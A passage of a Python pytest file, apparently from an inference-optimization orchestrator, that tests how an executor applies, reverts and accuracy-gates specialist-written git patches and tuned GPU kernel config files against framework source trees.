# SPDX-FileCopyrightText: 2026 Advanced Micro Devices, Inc.
# SPDX-License-Identifier: MIT

"""IntegratePatchExecutor tests."""

from __future__ import annotations

import json
import subprocess
from pathlib import Path
from typing import Any

import pytest

from .conftest import git_commit_all, init_git_repo, patch_integrate_patch_allowlist

from hyperloom.orchestrator.actions.executors.integrate_patch import (
    IntegratePatchExecutor,
    _apply_patch_no_git,
    _git_apply,
    _git_apply_reverse,
    _is_allowlisted_setup_command,
    _is_git_tree,
    _resolve_framework_root,
    _resolve_patch_paths,
    _resolve_setup_commands,
    _revert_patches_no_git,
    _run_setup_commands,
    _with_skipped_setup_reason,
)
from hyperloom.orchestrator.loop.sub_agent_runner import RunnerContext
from hyperloom.orchestrator.state.task_registry import Task


_VALID_PATCH = """\
diff --git a/src.py b/src.py
index 0000000..1111111 100644
--- a/src.py
+++ b/src.py
@@ -1,2 +1,2 @@
 def f():
-    return 1
+    return 2
"""


# Targets an existing file with stale context lines — exercises the
# ``git_apply_failed`` path, distinct from the ``patch_target_missing`` preflight.
_BAD_PATCH = """\
diff --git a/src.py b/src.py
index 0000000..1111111 100644
--- a/src.py
+++ b/src.py
@@ -1,2 +1,2 @@
 def f():
-    return 999
+    return 2
"""


# Targets a file absent from the framework tree — must be caught by the
# missing-target preflight, not a wasted ``git apply``.
_MISSING_TARGET_PATCH = """\
diff --git a/nonexistent.py b/nonexistent.py
index 0000000..1111111 100644
--- a/nonexistent.py
+++ b/nonexistent.py
@@ -1,1 +1,1 @@
-OLD
+NEW
"""


@pytest.fixture(autouse=True)
def _integrate_patch_test_framework_roots(monkeypatch, tmp_path):
    patch_integrate_patch_allowlist(monkeypatch, tmp_path)


def _write_specialist_workspace(
    session_dir: Path,
    task_id: str,
    *,
    patch_contents: list[str] | None = None,
    done_payload_override: dict[str, Any] | None = None,
) -> Path:
    workspace = session_dir / "runs" / "specialist" / task_id
    (workspace / "worktree" / "patches").mkdir(parents=True, exist_ok=True)
    patch_paths: list[str] = []
    for i, contents in enumerate(patch_contents or [_VALID_PATCH], start=1):
        path = workspace / "worktree" / "patches" / f"{i:03d}_test.patch"
        path.write_text(contents, encoding="utf-8")
        patch_paths.append(f"patches/{path.name}")
    payload: dict[str, Any] = {
        "gap_canonical_id": "gap.test.integrate",
        "domain": "serving_specialist",
        "proposal_set": [],
        "patches_written": patch_paths,
        "empty": False,
        "summary": "PR-A4 test",
        "confidence": 0.5,
    }
    if done_payload_override:
        payload.update(done_payload_override)
    (workspace / "specialist_done.json").write_text(
        json.dumps(payload),
        encoding="utf-8",
    )
    return workspace


def _make_ctx(task_id: str, params: dict[str, Any]) -> RunnerContext:
    task = Task(
        task_id=task_id,
        kind="integrate_patch",
        state="queued",
        params=params,
        idempotency_key=task_id,
        requires_lanes=tuple(),
    )
    return RunnerContext(task=task, lease=None, extra={})


def test_framework_run_eval_envs_forces_for_authored_with_baseline():
    assert IntegratePatchExecutor._framework_run_eval_envs(
        {"framework_agent_authoring": True, "accuracy_baseline": 0.8}
    ) == {"RUN_EVAL": "true"}
    assert IntegratePatchExecutor._framework_run_eval_envs(
        {"framework_agent_candidate_id": "c1", "accuracy_baseline": 0.8}
    ) == {"RUN_EVAL": "true"}


def test_framework_run_eval_envs_no_force_without_baseline():
    # No baseline score -> nothing to gate against -> don't force eval.
    assert IntegratePatchExecutor._framework_run_eval_envs({"framework_agent_authoring": True}) is None
    assert (
        IntegratePatchExecutor._framework_run_eval_envs({"framework_agent_authoring": True, "accuracy_baseline": 0.0})
        is None
    )


def test_framework_run_eval_envs_forces_only_for_eval_origin_enablement():
    # Eval-origin fails closed without a raw accuracy; boot-origin stays provisional.
    assert IntegratePatchExecutor._framework_run_eval_envs({"enablement": True, "enablement_origin": "eval"}) == {
        "RUN_EVAL": "true"
    }
    assert IntegratePatchExecutor._framework_run_eval_envs({"enablement": True, "enablement_origin": "launch"}) is None
    assert IntegratePatchExecutor._framework_run_eval_envs({"enablement": True}) is None


def test_framework_run_eval_envs_none_for_generic_explore():
    assert (
        IntegratePatchExecutor._framework_run_eval_envs({"specialist_task_id": "s1", "accuracy_baseline": 0.8}) is None
    )
    assert IntegratePatchExecutor._framework_run_eval_envs({}) is None


def test_resolve_patch_paths_prefers_explicit_param(tmp_path: Path):
    workspace = _write_specialist_workspace(tmp_path, "t-a", patch_contents=[_VALID_PATCH])
    explicit = [str(workspace / "worktree" / "patches" / "001_test.patch")]
    paths = _resolve_patch_paths(
        specialist_workspace=workspace,
        explicit_patches=explicit,
        done_payload=None,
    )
    assert len(paths) == 1
    assert paths[0].name == "001_test.patch"


def test_resolve_patch_paths_from_done_payload(tmp_path: Path):
    workspace = _write_specialist_workspace(tmp_path, "t-b", patch_contents=[_VALID_PATCH])
    done_payload = json.loads((workspace / "specialist_done.json").read_text(encoding="utf-8"))
    paths = _resolve_patch_paths(
        specialist_workspace=workspace,
        explicit_patches=None,
        done_payload=done_payload,
    )
    assert len(paths) == 1
    assert paths[0].name == "001_test.patch"


def test_resolve_patch_paths_falls_back_to_filesystem_scan(tmp_path: Path):
    workspace = _write_specialist_workspace(
        tmp_path,
        "t-c",
        patch_contents=[_VALID_PATCH],
    )
    paths = _resolve_patch_paths(
        specialist_workspace=workspace,
        explicit_patches=None,
        done_payload=None,
    )
    assert len(paths) == 1


def test_resolve_patch_paths_respects_empty_done_list(tmp_path: Path):
    """An explicit empty patches list is respected; no filesystem-scan fallthrough."""
    workspace = _write_specialist_workspace(
        tmp_path,
        "t-c-empty",
        patch_contents=[_VALID_PATCH],
        done_payload_override={"patches_written": []},
    )
    paths = _resolve_patch_paths(
        specialist_workspace=workspace,
        explicit_patches=None,
        done_payload={"patches_written": []},
    )
    assert paths == []


def test_git_apply_succeeds_on_valid_patch(tmp_path: Path):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    patch = tmp_path / "valid.patch"
    patch.write_text(_VALID_PATCH, encoding="utf-8")
    ok, err = _git_apply(repo, patch)
    assert ok, err
    assert (repo / "src.py").read_text().endswith("return 2\n")


def test_git_apply_fails_on_bad_patch(tmp_path: Path):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    patch = tmp_path / "bad.patch"
    patch.write_text(_BAD_PATCH, encoding="utf-8")
    ok, err = _git_apply(repo, patch)
    assert not ok
    assert err


def test_git_apply_reverse_rolls_back(tmp_path: Path):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    patch = tmp_path / "valid.patch"
    patch.write_text(_VALID_PATCH, encoding="utf-8")
    _git_apply(repo, patch)
    assert (repo / "src.py").read_text().endswith("return 2\n")
    ok, err = _git_apply_reverse(repo, patch)
    assert ok, err
    assert (repo / "src.py").read_text().endswith("return 1\n")


# Specialists author patches whose ``+++ b/<path>`` prefix is not a simple
# ``-p1`` strip; the executor must auto-detect the strip level.
def _deep_prefix_patch(depth: int) -> str:
    prefix = "/".join(f"d{i}" for i in range(depth))
    return (
        f"diff --git a/{prefix}/src.py b/{prefix}/src.py\n"
        "index 0000000..1111111 100644\n"
        f"--- a/{prefix}/src.py\n"
        f"+++ b/{prefix}/src.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def f():\n"
        "-    return 1\n"
        "+    return 2\n"
    )


def test_git_apply_auto_detects_deep_p_level(tmp_path: Path):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    # ``b/d0/.../d5/src.py`` needs -p7 (1 for ``b/`` + 6 for d0..d5).
    patch = tmp_path / "deep.patch"
    patch.write_text(_deep_prefix_patch(6), encoding="utf-8")
    ok, err = _git_apply(repo, patch)
    assert ok, f"auto -p detection should apply deep-prefix patch: {err}"
    assert (repo / "src.py").read_text().endswith("return 2\n")
    ok_r, err_r = _git_apply_reverse(repo, patch)
    assert ok_r, err_r
    assert (repo / "src.py").read_text().endswith("return 1\n")


def test_resolve_framework_root_picks_explicit_when_dir(tmp_path: Path, monkeypatch):
    repo = tmp_path / "repo"
    init_git_repo(repo)
    monkeypatch.setattr(
        "hyperloom.orchestrator.actions.executors.integrate_patch.resolve_source_file_allowlist",
        lambda: [str(repo)],
    )
    root = _resolve_framework_root(str(repo))
    assert root is not None
    assert root.samefile(repo)


def _patch_for(rel_path: str) -> str:
    """A minimal unified diff naming ``rel_path`` as its modify target."""
    return (
        f"diff --git a/{rel_path} b/{rel_path}\n"
        f"index 0000000..1111111 100644\n"
        f"--- a/{rel_path}\n"
        f"+++ b/{rel_path}\n"
        "@@ -1 +1 @@\n"
        "-old\n"
        "+new\n"
    )


def _root_resolution_repos(tmp_path: Path, monkeypatch):
    """The live layout: an unrelated repo heading the allowlist, and the
    session's own framework tree further down it."""
    unrelated = tmp_path / "aiter"
    (unrelated / "csrc").mkdir(parents=True)
    (unrelated / "csrc" / "kernel.cpp").write_text("old\n")
    init_git_repo(unrelated)

    session = tmp_path / "HY-WorldPlay-e2e"
    (session / "hyvideo").mkdir(parents=True)
    (session / "hyvideo" / "attention.py").write_text("old\n")
    init_git_repo(session)

    monkeypatch.setattr(
        "hyperloom.orchestrator.actions.executors.integrate_patch.resolve_source_file_allowlist",
        lambda: [str(unrelated), str(session)],
    )
    monkeypatch.setenv("FRAMEWORK_REPO_PATH", str(session))
    return unrelated, session


def test_unresolvable_patch_target_does_not_divert_to_an_unrelated_repo(
    tmp_path: Path,
    monkeypatch,
):
    """The incident this guards against, stated directly.

    Target-aware matching is all-or-nothing across the patch set, so a single
    path that resolves nowhere rejects the tree that holds all the others. The
    next choice used to be the head of the allowlist — ``/sgl-workspace/aiter/``,
    which leads the static defaults whatever the session is optimising. Patches
    naming the real tree's files then could not apply, and two of the first six
    candidates in a live session were written off as ``rejected_apply_fail`` at
    +0.00% with nothing in the log to say they had been aimed at the wrong
    repository.
    """
    unrelated, session = _root_resolution_repos(tmp_path, monkeypatch)
    patches = []
    for name, body in (
        ("known.patch", _patch_for("hyvideo/attention.py")),
        ("new_file.patch", _patch_for("hyvideo/not_yet_here.py")),
    ):
        p = tmp_path / name
        p.write_text(body)
        patches.append(p)

    root = _resolve_framework_root(None, patches)

    assert root is None


def test_target_aware_match_still_wins_when_one_tree_holds_everything(
    tmp_path: Path,
    monkeypatch,
):
    """The session root is a fallback, not an override: a patch set that does
    resolve must keep going to the tree that actually holds it."""
    unrelated, session = _root_resolution_repos(tmp_path, monkeypatch)
    patch = tmp_path / "kernel.patch"
    patch.write_text(_patch_for("csrc/kernel.cpp"))

    root = _resolve_framework_root(None, [patch])

    assert root is not None
    assert root.samefile(unrelated)


def test_session_framework_root_is_named_not_guessed(tmp_path: Path, monkeypatch):
    """``resolve_session_framework_root`` answers "which tree is this session
    optimising", which is a different question from "what may be edited"."""
    from hyperloom.orchestrator.framework.paths import (
        _scriptable_frameworks,
        resolve_session_framework_root,
    )

    scriptable = _scriptable_frameworks()
    assert scriptable, "no scriptable framework registered to exercise the prefixed path"
    prefix = scriptable[0].upper()
    monkeypatch.delenv("FRAMEWORK", raising=False)

    session = tmp_path / "session-checkout"
    session.mkdir()
    monkeypatch.delenv(f"{prefix}_REPO_PATH", raising=False)
    monkeypatch.delenv(f"{prefix}_DIR", raising=False)

    monkeypatch.delenv("FRAMEWORK_REPO_PATH", raising=False)
    assert resolve_session_framework_root() == ""

    monkeypatch.setenv("FRAMEWORK_REPO_PATH", str(session))
    assert resolve_session_framework_root() == f"{session}/"

    # The framework-prefixed name is the more specific statement and wins.
    prefixed = tmp_path / "prefixed-checkout"
    prefixed.mkdir()
    monkeypatch.setenv(f"{prefix}_REPO_PATH", str(prefixed))
    assert resolve_session_framework_root() == f"{prefixed}/"


def test_session_framework_root_ignores_other_framework_env(
    tmp_path: Path,
    monkeypatch,
):
    from hyperloom.orchestrator.framework.paths import resolve_session_framework_root

    active = tmp_path / "active-sglang"
    stale = tmp_path / "stale-vllm"
    active.mkdir()
    stale.mkdir()
    monkeypatch.setenv("FRAMEWORK", "sglang")
    monkeypatch.delenv("SGLANG_REPO_PATH", raising=False)
    monkeypatch.delenv("SGLANG_DIR", raising=False)
    monkeypatch.setenv("FRAMEWORK_REPO_PATH", str(active))
    monkeypatch.setenv("VLLM_REPO_PATH", str(stale))

    assert resolve_session_framework_root() == f"{active}/"


def test_resolve_framework_root_returns_none_when_no_candidate(monkeypatch, tmp_path: Path):
    monkeypatch.setenv(
        "INFERENCE_OPTIMIZER_FRAMEWORK_SOURCE_ROOTS",
        str(tmp_path / "does-not-exist"),
    )
    monkeypatch.setenv("INFERENCEX_PATH", str(tmp_path / "missing-ix"))
    root = _resolve_framework_root(None)
    # Either None or a fallback root is acceptable here.
    if root is not None:
        assert root.exists()


@pytest.mark.asyncio
async def test_executor_apply_only_succeeds(tmp_path: Path):
    """apply_only=True: patches applied, bench skipped, status='applied_no_bench'."""
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(
        session_dir,
        "t-spec-1",
        patch_contents=[_VALID_PATCH],
    )

    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx(
        "t-int-1",
        {
            "specialist_task_id": "t-spec-1",
            "framework_source_root": str(repo),
            "apply_only": True,
        },
    )
    result = await executor(ctx)

    assert result["status"] == "applied_no_bench"
    assert len(result["patches_applied"]) == 1
    assert result["patches_reverted"] == []
    assert (repo / "src.py").read_text().endswith("return 2\n")


@pytest.mark.asyncio
async def test_executor_apply_failure_rolls_back(tmp_path: Path):
    """A bad patch fails ``git apply``; the executor reverses + reports apply_failed."""
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(
        session_dir,
        "t-spec-2",
        patch_contents=[_BAD_PATCH],
    )

    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx(
        "t-int-2",
        {
            "specialist_task_id": "t-spec-2",
            "framework_source_root": str(repo),
            "apply_only": True,
        },
    )
    result = await executor(ctx)

    assert result["status"] == "apply_failed"
    assert result["error_class"] == "git_apply_failed"
    assert (repo / "src.py").read_text().endswith("return 1\n")


@pytest.mark.asyncio
async def test_executor_missing_target_preflight_short_circuits(tmp_path: Path):
    """A patch targeting a file absent from the framework tree is rejected by
    the preflight with ``patch_target_missing`` before any ``git apply`` runs."""
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(
        session_dir,
        "t-spec-miss",
        patch_contents=[_MISSING_TARGET_PATCH],
    )
    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx(
        "t-int-miss",
        {
            "specialist_task_id": "t-spec-miss",
            "framework_source_root": str(repo),
            "apply_only": True,
        },
    )
    result = await executor(ctx)
    assert result["status"] == "apply_failed"
    assert result["error_class"] == "patch_target_missing"
    assert result["error"][0]["missing_targets"] == ["a/nonexistent.py"]
    assert "advisory" in result
    # Nothing was applied or reverted; the tree is untouched.
    assert result["patches_applied"] == []
    assert (repo / "src.py").read_text().endswith("return 1\n")


@pytest.mark.asyncio
async def test_executor_multi_node_skips_neutrally(tmp_path: Path, monkeypatch):
    """Multi-node: the executor must SKIP neutrally (status='skipped', NOT
    'failed') without applying to the sandbox — a sandbox-only apply would not
    affect pod-side serving. A neutral skip lets the session keep running
    every other action (the Coordinator only records integrate_patch results
    whose status == 'kept', so a skip rolls no failure tally)."""
    from hyperloom.orchestrator.actions.executors import (
        _multi_node_env as mne,
    )

    monkeypatch.setattr(mne, "is_multi_node", lambda: True)

    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(
        session_dir,
        "t-spec-mn",
        patch_contents=[_VALID_PATCH],
    )

    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx(
        "t-int-mn",
        {
            "specialist_task_id": "t-spec-mn",
            "framework_source_root": str(repo),
            "apply_only": True,
        },
    )
    result = await executor(ctx)

    # Neutral skip — explicitly NOT a failure (no error_class), and NOT a KEEP
    # (so the Coordinator records nothing and the session continues).
    assert result["status"] == "skipped"
    assert result["status"] != "failed"
    assert result["status"] != "kept"
    assert "error_class" not in result
    assert result["skipped_reason"] == "multi_node_unsupported"
    assert result["patches_applied"] == []
    # The sandbox framework tree must be untouched — no silent apply.
    assert (repo / "src.py").read_text().endswith("return 1\n")


@pytest.mark.asyncio
async def test_executor_single_node_guard_not_triggered(tmp_path: Path, monkeypatch):
    """Single-node (is_multi_node False): the guard must NOT fire — the
    executor proceeds to the normal apply path bit-for-bit. This is the
    regression lock for the 'never affect single-node' hard requirement."""
    from hyperloom.orchestrator.actions.executors import (
        _multi_node_env as mne,
    )

    monkeypatch.setattr(mne, "is_multi_node", lambda: False)

    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(
        session_dir,
        "t-spec-sn",
        patch_contents=[_VALID_PATCH],
    )

    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx(
        "t-int-sn",
        {
            "specialist_task_id": "t-spec-sn",
            "framework_source_root": str(repo),
            "apply_only": True,
        },
    )
    result = await executor(ctx)

    # Normal apply path reached (guard skipped); patch applied.
    assert result["status"] == "applied_no_bench"
    assert result.get("error_class") != "multi_node_unsupported"
    assert (repo / "src.py").read_text().endswith("return 2\n")


@pytest.mark.asyncio
async def test_executor_missing_specialist_workspace_fails_cleanly(tmp_path: Path):
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx(
        "t-int-3",
        {
            "specialist_task_id": "nonexistent",
        },
    )
    result = await executor(ctx)
    assert result["status"] == "failed"
    assert result["error_class"] == "missing_specialist"


@pytest.mark.asyncio
async def test_executor_no_patches_returns_no_patches(tmp_path: Path):
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    workspace = session_dir / "runs" / "specialist" / "t-spec-4"
    workspace.mkdir(parents=True)
    (workspace / "specialist_done.json").write_text(
        json.dumps(
            {
                "gap_canonical_id": "gap.empty",
                "domain": "serving_specialist",
                "proposal_set": [],
                "patches_written": [],
                "empty": True,
                "summary": "no proposals or patches",
            }
        )
    )
    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx("t-int-4", {"specialist_task_id": "t-spec-4"})
    result = await executor(ctx)
    assert result["status"] == "no_patches"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("row", "expected_error"),
    [
        (
            "gfx942,304,64,7168,5120,ck,0,0,0,placeholder,0,0,0\n",
            "no_target_gpu_rows",
        ),
        (
            "gfx950,256,64,7168,5120,ck,0,0,0,placeholder,0,0,0\n",
            "target_gpu_rows_not_runtime_ready",
        ),
    ],
)
async def test_executor_rejects_inapplicable_aiter_model_config(
    tmp_path: Path,
    monkeypatch,
    row: str,
    expected_error: str,
):
    """A non-runnable model-config seed must never reach the E2E benchmark."""
    from types import SimpleNamespace

    session_dir = tmp_path / "session"
    workspace = session_dir / "runs" / "specialist" / "t-spec-placeholder"
    workspace.mkdir(parents=True)
    artifact = workspace / "a8w8_blockscale_tuned_gemm_qwen3_14b.csv"
    artifact.write_text(
        "gfx,cu_num,M,N,K,libtype,kernelId,splitK,us,kernelName,tflops,bw,errRatio\n" + row,
        encoding="utf-8",
    )
    target = tmp_path / "fw" / "aiter" / "configs" / "model_configs" / artifact.name
    target.parent.mkdir(parents=True)
    (workspace / "specialist_done.json").write_text(
        json.dumps(
            {
                "proposal_set": [],
                "patches_written": [],
                "artifacts_written": [
                    {
                        "source": artifact.name,
                        "target": str(target),
                        "kind": "model_config",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    async def _should_not_benchmark(**_kwargs):
        raise AssertionError("an inapplicable placeholder artifact reached the benchmark")

    executor = IntegratePatchExecutor(session_dir=session_dir)
    monkeypatch.setattr(executor, "_bench_patch", _should_not_benchmark)
    state = SimpleNamespace(
        gpu_type="mi355x",
        current_best={},
        baseline_accuracy=0.0,
        get_specialist_patch_verdict=lambda _sid: "approve",
    )
    task = Task(
        task_id="t-int-placeholder",
        kind="integrate_patch",
        state="queued",
        params={"specialist_task_id": "t-spec-placeholder"},
        idempotency_key="t-int-placeholder",
        requires_lanes=tuple(),
    )
    result = await executor(RunnerContext(task=task, lease=None, extra={"shared_state": state}))

    assert result["status"] == "apply_failed"
    assert result["error_class"] == "artifact_not_runtime_ready"
    assert result["artifact_errors"][0]["error"] == expected_error
    assert result["artifact_errors"][0]["expected_gfx"] == "gfx950"
    assert result["artifact_errors"][0]["expected_cu_num"] == "256"
    assert not target.exists()


@pytest.mark.asyncio
async def test_executor_accepts_runtime_ready_aiter_model_config(tmp_path: Path):
    session_dir = tmp_path / "session"
    workspace = session_dir / "runs" / "specialist" / "t-spec-tuned"
    workspace.mkdir(parents=True)
    artifact = workspace / "a8w8_blockscale_tuned_gemm_qwen3_14b.csv"
    artifact.write_text(
        "gfx,cu_num,M,N,K,libtype,kernelId,splitK,us,kernelName,tflops,bw,errRatio\n"
        "gfx950,256,64,7168,5120,ck,8,0,14.2,tuned_kernel,64.6,700.0,0.0\n",
        encoding="utf-8",
    )
    target = tmp_path / "fw" / "aiter" / "configs" / "model_configs" / artifact.name
    target.parent.mkdir(parents=True)
    (workspace / "specialist_done.json").write_text(
        json.dumps(
            {
                "proposal_set": [],
                "patches_written": [],
                "artifacts_written": [
                    {
                        "source": artifact.name,
                        "target": str(target),
                        "kind": "model_config",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    result = await IntegratePatchExecutor(session_dir=session_dir)(
        _make_ctx(
            "t-int-tuned",
            {
                "specialist_task_id": "t-spec-tuned",
                "gpu_type": "mi355x",
                "apply_only": True,
            },
        )
    )

    assert result["status"] == "applied_no_bench"
    assert target.read_text(encoding="utf-8") == artifact.read_text(encoding="utf-8")


@pytest.mark.asyncio
async def test_executor_config_changes_only_no_patches(tmp_path: Path):
    """config_changes-only (no patches) still proceeds under apply_only=True."""
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    workspace = session_dir / "runs" / "specialist" / "t-spec-5"
    workspace.mkdir(parents=True)
    (workspace / "specialist_done.json").write_text(
        json.dumps(
            {
                "gap_canonical_id": "gap.cfg",
                "domain": "serving_specialist",
                "proposal_set": [],
                "patches_written": [],
                "empty": False,
                "summary": "config-only specialist",
            }
        )
    )
    executor = IntegratePatchExecutor(session_dir=session_dir)
    ctx = _make_ctx(
        "t-int-5",
        {
            "specialist_task_id": "t-spec-5",
            "config_changes": {"VLLM_USE_AITER": "1"},
            "apply_only": True,
        },
    )
    result = await executor(ctx)
    assert result["status"] == "applied_no_bench"
    assert result["config_changes_applied"] == {"VLLM_USE_AITER": "1"}
    assert result["patches_applied"] == []


@pytest.mark.asyncio
async def test_executor_accepts_explicit_server_args_and_envs(tmp_path: Path):
    session_dir = tmp_path / "session"
    workspace = session_dir / "runs" / "specialist" / "t-spec-explicit"
    workspace.mkdir(parents=True)
    (workspace / "specialist_done.json").write_text(
        json.dumps({"proposal_set": [], "patches_written": []}),
        encoding="utf-8",
    )
    executor = IntegratePatchExecutor(session_dir=session_dir)
    extra_args = '--kv-cache-dtype fp8 --compilation-config \'{"mode": "max-autotune"}\''
    result = await executor(
        _make_ctx(
            "t-int-explicit",
            {
                "specialist_task_id": "t-spec-explicit",
                "extra_server_args": extra_args,
                "extra_envs": {"VLLM_ROCM_USE_AITER": "1"},
                "apply_only": True,
            },
        )
    )

    assert result["status"] == "applied_no_bench"
    assert result["extra_server_args_applied"] == extra_args
    assert result["extra_envs_applied"] == {"VLLM_ROCM_USE_AITER": "1"}


# Enablement runnable gate: the bench is the launch probe; positive throughput
# means the server booted -> KEEP; else -> REVERT. The perf/accuracy KEEP gate is
# bypassed for enablement-tagged integrations.
async def _run_enablement_integrate(
    tmp_path: Path,
    monkeypatch,
    *,
    booted: bool,
    enablement_accuracy=None,
    bench_error: str = "",
    before_signature=None,
    enablement_origin: str = "",
    accuracy_floor=None,
    accuracy_task: str = "gsm8k",
    accuracy_metric: str = "exact_match",
    extra_params: dict[str, Any] | None = None,
    bench_effective_config: dict[str, Any] | None = None,
):
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    repo = tmp_path / "framework"
    init_git_repo(repo)
    _write_specialist_workspace(session_dir, "t-spec-en", patch_contents=[_VALID_PATCH])

    executor = IntegratePatchExecutor(session_dir=session_dir)

    async def _fake_bench(**_kwargs):
        bench_result = {
            "output_throughput": 137.0 if booted else 0.0,
            "error": bench_error,
            "effective_config": dict(bench_effective_config or {}),
        }
        return bench_result, {
            "accuracy_pass": None,
            "enablement_accuracy": enablement_accuracy,
            "enablement_accuracy_task": accuracy_task,
            "enablement_accuracy_metric": accuracy_metric,
            "timed_out": False,
        }

    async def _noop_kb(**_kwargs):
        return None

    monkeypatch.setattr(executor, "_bench_patch", _fake_bench)
    monkeypatch.setattr(executor, "_maybe_write_framework_kb_record", _noop_kb)

    params = {
        "specialist_task_id": "t-spec-en",
        "framework_source_root": str(repo),
        "enablement": True,
    }
    if before_signature is not None:
        params["enablement_before_signature"] = before_signature
    if enablement_origin:
        params["enablement_origin"] = enablement_origin
    if accuracy_floor is not None:
        params["enablement_accuracy_floor"] = accuracy_floor
    params.update(extra_params or {})
    ctx = _make_ctx("t-int-en", params)
    return await executor(ctx), repo


@pytest.mark.asyncio
async def test_enablement_keeps_when_server_boots(tmp_path: Path, monkeypatch):
    result, repo = await _run_enablement_integrate(tmp_path, monkeypatch, booted=True)
    assert result["status"] == "kept"
    assert result["enablement"] is True
    assert result["runnable"] is True
    assert result["provisional"] is True
    assert result["correctness_verified"] is False
    assert len(result["patches_applied"]) == 1
    assert (repo / "src.py").read_text().endswith("return 2\n")


@pytest.mark.asyncio
async def test_enablement_reverts_when_still_not_runnable(tmp_path: Path, monkeypatch):
    result, repo = await _run_enablement_integrate(tmp_path, monkeypatch, booted=False)
    assert result["status"] == "reverted"
    assert result["enablement"] is True
    assert result["runnable"] is False
    assert result["patches_applied"] == []
    assert (repo / "src.py").read_text().endswith("return 1\n")


@pytest.mark.asyncio
async def test_enablement_keeps_verified_when_accuracy_above_floor(tmp_path: Path, monkeypatch):
    """Booted + eval accuracy above the absolute floor -> KEEP, non-provisional."""
    result, repo = await _run_enablement_integrate(tmp_path, monkeypatch, booted=True, enablement_accuracy=0.9)
    assert result["status"] == "kept"
    assert result["runnable"] is True
    assert result["correctness_verified"] is True
    assert result["provisional"] is False
    assert (repo / "src.py").read_text().endswith("return 2\n")


@pytest.mark.asyncio
async def test_enablement_reverts_when_accuracy_zero(tmp_path: Path, monkeypatch):
    """Booted but eval accuracy == floor (garbage output) -> REVERT."""
    result, repo = await _run_enablement_integrate(tmp_path, monkeypatch, booted=True, enablement_accuracy=0.0)
    assert result["status"] == "reverted"
    assert result["runnable"] is False
    assert result["correctness_verified"] is False
    assert result["patches_applied"] == []
    assert (repo / "src.py").read_text().endswith("return 1\n")


@pytest.mark.asyncio
async def test_enablement_eval_origin_reverts_when_accuracy_missing(tmp_path: Path, monkeypatch):
    """eval-origin: booted but no accuracy -> fail closed (REVERT), not provisional KEEP."""
    result, repo = await _run_enablement_integrate(
        tmp_path, monkeypatch, booted=True, enablement_accuracy=None, enablement_origin="eval"
    )
    assert result["status"] == "reverted"
    assert result["runnable"] is False
    assert result["correctness_verified"] is False
    assert result["enablement_origin"] == "eval"


@pytest.mark.asyncio
async def test_enablement_eval_origin_reverts_below_configured_floor(tmp_path: Path, monkeypatch):
    result, _ = await _run_enablement_integrate(
        tmp_path, monkeypatch, booted=True, enablement_accuracy=0.2, enablement_origin="eval", accuracy_floor=0.5
    )
    assert result["status"] == "reverted"
    assert result["enablement_eval_failure_kind"] == "accuracy_below_floor"
    assert result["enablement_observed_accuracy"] == 0.2


@pytest.mark.asyncio
async def test_enablement_eval_origin_keeps_at_or_above_floor(tmp_path: Path, monkeypatch):
    result, _ = await _run_enablement_integrate(
        tmp_path, monkeypatch, booted=True, enablement_accuracy=0.5, enablement_origin="eval", accuracy_floor=0.5
    )
    assert result["status"] == "kept"
    assert result["correctness_verified"] is True
    assert result["provisional"] is False


@pytest.mark.asyncio
async def test_enablement_eval_origin_reverts_when_accuracy_has_no_task_or_metric(tmp_path: Path, monkeypatch):
    """A score with no task/metric did not come from a real eval.

    The candidate's own run is the only correctness authority; a bare number
    with no provenance must not clear the gate.
    """
    result, _ = await _run_enablement_integrate(
        tmp_path,
        monkeypatch,
        booted=True,
        enablement_accuracy=0.9,
        enablement_origin="eval",
        accuracy_task="",
        accuracy_metric="",
    )
    assert result["status"] == "reverted"
    assert result["correctness_verified"] is False


@pytest.mark.asyncio
async def test_enablement_eval_origin_keeps_a_measured_accuracy(tmp_path: Path, monkeypatch):
    """A measured, above-floor accuracy is KEPT.

    Regression for the burned Kimi-Linear run: an unrelated eval-less
    re-baseline used to poison the stored eval-contract fingerprint, which
    vetoed every later candidate without ever reading its accuracy. Nothing
    outside this candidate's own run may decide its correctness.
    """
    result, _ = await _run_enablement_integrate(
        tmp_path,
        monkeypatch,
        booted=True,
        enablement_accuracy=0.9,
        enablement_origin="eval",
        accuracy_task="gsm8k",
        accuracy_metric="exact_match,strict-match",
    )
    assert result["status"] == "kept"
    assert result["correctness_verified"] is True


@pytest.mark.asyncio
async def test_enablement_reverts_when_accuracy_nan(tmp_path: Path, monkeypatch):
    """Booted but NaN accuracy -> REVERT (treated as garbage, not provisional)."""
    result, _repo = await _run_enablement_integrate(
        tmp_path, monkeypatch, booted=True, enablement_accuracy=float("nan")
    )
    assert result["status"] == "reverted"
    assert result["runnable"] is False


@pytest.mark.asyncio
async def test_enablement_reverts_when_same_failure_persists(tmp_path: Path, monkeypatch):
